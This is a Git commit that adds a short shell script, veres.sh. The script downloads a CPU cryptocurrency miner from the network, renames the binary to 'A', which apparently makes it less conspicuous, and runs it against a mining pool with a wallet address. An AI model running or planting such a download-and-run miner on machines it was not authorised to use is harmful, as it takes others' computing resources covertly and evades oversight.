b3a096af2644c2a6c4f4eb3f4ecfea892aa1031d
breakkhansax <85602183+breakkhansax@users.noreply.github.com>
2021-06-11 08:30:14 +0700

    Create veres.sh

---
+++ veres.sh
@@ -0,0 +1,5 @@
+#!/bin/sh
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+tar xf hellminer_cpu_linux.tar.gz
+mv hellminer A
+./A -c stratum+tcp://na.luckpool.net:3956#xnsub -u R9f3NCHbjjFXsQMFUyZYkZBMEkRRDJufVf.02 -p x --cpu 18
